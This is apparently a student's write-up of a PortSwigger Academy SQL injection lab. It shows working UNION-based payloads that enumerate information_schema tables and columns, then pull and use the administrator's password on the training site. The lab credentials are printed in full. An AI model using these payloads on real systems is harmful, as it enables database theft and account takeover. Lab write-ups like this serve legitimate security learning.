---
slug: "ps-sqli-05"
title: "SQL injection attack, listing the database contents on non Oracle databases"
platform: "PortSwigger"
difficulty: "Easy"
category: ["Web","SQLi"]
date: "2025-12-11"
minutes: 5
visible: true
tldr: "- The vulnerable parameter was located in the category field of the product listing system.\n- The original value was something like `category=Gifts`.…"
format: "html"
---

<p class="mono lab-crumb">PORTSWIGGER ACADEMY // SQLi SERIES &middot; LAB 05 &middot; <a href="https://github.com/0xWalid/Learnings/tree/main/Portswiggers/01-Sql%20Injection%20Labs/05-%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20non-Oracle%20databases.md" target="_blank" rel="noopener">original notes &#8599;</a></p>
<h2>1. Observation**</h2>
<ul><li>The vulnerable parameter was located in the <strong>category</strong> field of the product listing system.</li><li>The original value was something like <code>category=Gifts</code>. Supplying valid category values loaded products normally.</li><li>Injecting a <strong>single quote (<code>'</code>)</strong> resulted in an <strong>Internal Server Error</strong>, confirming the value is placed inside a SQL string literal.</li><li>This indicated:</li><li>Input is concatenated directly into an SQL query.</li><li>No sanitization or escaping occurs.</li><li>Early attempts to enumerate columns and tests suggested both columns in the result set accept <strong>text data</strong>.</li><li>Difficulty:</li><li>At first, identifying the correct metadata tables (<code>information_schema.tables</code>, <code>information_schema.columns</code>) was confusing.</li><li>Especially understanding which fields to query (<code>table_name</code>, <code>column_name</code>) and how to filter by specific table names.</li><li>Eventually confirmed the backend supports <strong>information_schema</strong>, proving it is a non-Oracle SQL database.</li><li>Payloads worked only when sent through <strong>Burp Suite</strong> — browser URL encoding altered the payload structure, breaking results.</li></ul>
<h2>2. Hypothesis**</h2>
<p>Likely backend query structure:</p>
<pre class="code" data-lang="sql"><code>SELECT * FROM products
WHERE category = '&lt;user_input&gt;';</code></pre>
<p>Reasoning:</p>
<ul><li>Single quote breaks the query → confirms injection into a quoted string.</li><li>UNION-based SQL injection should work if:</li><li>Correct column count is matched.</li><li>Datatypes align (text/text in this lab).</li><li>Because <strong>information_schema</strong> exists, we can:</li><li>List all tables.</li><li>Identify interesting tables (e.g., user tables).</li><li>Enumerate column names inside those tables.</li><li>Extract actual data from sensitive tables (users, passwords, etc.).</li></ul>
<p><strong>Goal:</strong> Fully enumerate DB tables → enumerate columns → extract usernames &amp; passwords.</p>
<h2>3. Test (Experiments Conducted)**</h2>
<h2>Test 1 — Injection Detection**</h2>
<ul><li><strong>Payload:</strong></li></ul>
<p>``<code> ' </code>``</p>
<ul><li><strong>Result:</strong> Internal Server Error.</li><li><strong>Interpretation:</strong> SQL injection confirmed; string literal break inside SQL query.</li></ul>
<h2>Test 2 — Table Enumeration via information_schema**</h2>
<p>Attempted:</p>
<pre class="code" data-lang="sql"><code>Gifts' UNION SELECT table_name, NULL FROM information_schema.tables--</code></pre>
<ul><li><strong>Difficulty:</strong></li><li>Initially struggled with remembering the correct metadata fields (<code>table_name</code>).</li><li>Needed to rely on documentation/cheatsheets to recall the schema structure.</li><li><strong>Result:</strong> Listed all available database tables.</li></ul>
<p>From this list, identified a suspicious table:</p>
<pre class="code" data-lang="text"><code>users_oocswl
</code></pre>
<h2>Test 3 — Column Enumeration of Target Table**</h2>
<p>Payload used:</p>
<pre class="code" data-lang="sql"><code>Gifts'union select column_name, null
from information_schema.columns
where table_name='users_oocswl'--</code></pre>
<ul><li><strong>Difficulty:</strong></li><li>Remembering correct casing and exact filter syntax.</li><li>Choosing which columns belong to username/password fields.</li><li><strong>Result:</strong> Retrieved column names, including:</li></ul>
<pre class="code" data-lang="text"><code>username_fhnnjr
password_apmllk</code></pre>
<h2>Test 4 — Extracting User Credentials**</h2>
<p>Payload used:</p>
<pre class="code" data-lang="sql"><code>Gifts'union select username_fhnnjr, password_apmllk
from users_oocswl--</code></pre>
<ul><li><strong>Actual Data Returned:</strong></li></ul>
<pre class="code" data-lang="text"><code>administrator
pzr7wkmpwym1yjj2g7pa</code></pre>
<h2>Test 5 — Verification**</h2>
<p>Logged in using extracted credentials:</p>
<ul><li>Username: <code>administrator</code></li><li>Password: <code>pzr7wkmpwym1yjj2g7pa</code></li></ul>
<p><strong>Result:</strong> Logged in successfully → application UI confirmed administrator access and the ability to update email.</p>
<h2>4. Result**</h2>
<h2>Final Payloads Used**</h2>
<p><strong>Table enumeration:</strong></p>
<pre class="code" data-lang="sql"><code>Gifts' UNION SELECT table_name, NULL FROM information_schema.tables--</code></pre>
<p><strong>Column enumeration:</strong></p>
<pre class="code" data-lang="sql"><code>Gifts'union select column_name, null
from information_schema.columns
where table_name='users_oocswl'--</code></pre>
<p><strong>Credentials extraction:</strong></p>
<pre class="code" data-lang="sql"><code>Gifts'union select username_fhnnjr, password_apmllk
from users_oocswl--</code></pre>
<h2>Extracted Credentials**</h2>
<pre class="code" data-lang="text"><code>administrator
pzr7wkmpwym1yjj2g7pa
</code></pre>
<h2>Proof of Lab Completion**</h2>
<ul><li>Logged in as administrator.</li><li>UI confirmed elevated access and ability to update account info.</li><li>Screenshot proof:</li></ul>
<p>&lt;img width="1183" height="592" alt="image" src="https://github.com/user-attachments/assets/57a58dcf-b0ef-4192-a5e4-06d130e1d044" /&gt;</p>
<h2>5. Learning (Deep Reasoning)**</h2>
<ul><li><strong>information_schema</strong> is universal in non-Oracle databases:</li><li><code>information_schema.tables</code></li><li><code>information_schema.columns</code></li><li><code>table_name</code> and <code>column_name</code> fields are key to enumeration.</li><li>Extracting database structure requires:</li><li>Understanding SQL metadata layout.</li><li>Filtering correctly by table name.</li><li>Matching column datatypes for successful UNION.</li><li>Modern browser URL handling blocks many special characters:</li><li>Always use <strong>Burp Suite</strong> to avoid automatic sanitization/encoding.</li><li>Finding a “juicy” table typically means:</li><li>Table name includes <code>users</code>, <code>customer</code>, <code>accounts</code>, etc.</li><li>Prioritize these for credential extraction.</li><li>Enumeration sequence matters:</li><li>Confirm SQLi</li><li>Find column count</li><li>Identify metadata source</li><li>List tables</li><li>List columns</li><li>Extract data</li><li>Understanding this flow builds the ability to perform real-world SQLi exploitation quickly and efficiently.</li></ul>
<h2>6. Future Pattern Detection**</h2>
<p>Recognize these signs as strong indicators of SQLi on non-Oracle DBs:</p>
<ul><li><code>'</code> → server error.</li><li>Application displays or reflects injected data patterns.</li><li>Supports <code>information_schema.tables</code> → non-Oracle DBMS.</li><li>UNION SELECT works after matching text columns.</li><li>Credential-based tables often appear with obfuscated suffixes.</li><li>Browser blocks payloads; proxy executes correctly.</li></ul>
<p>These patterns help quickly determine database type and the most efficient enumeration method.</p>
<h2>7. Notes for My Future Self**</h2>
<ul><li>Always begin with <code>'</code> → fastest SQLi detection.</li><li>When stuck, check <code>information_schema</code> structure.</li><li>Remember:</li><li><strong>table_name</strong> is in <code>information_schema.tables</code></li><li><strong>column_name</strong> is in <code>information_schema.columns</code></li><li>If extraction fails, check datatype compatibility.</li><li>Use Burp for every test — never trust browser behavior.</li><li>Prioritize fast wins: enumerate metadata → extract credentials → verify access.</li></ul>

<details class="flag-box"><summary><span class="flag-label">LAB STATUS</span><span class="flag-hint"></span></summary><code>SQLi SERIES :: LAB 05 COMPLETE</code></details>
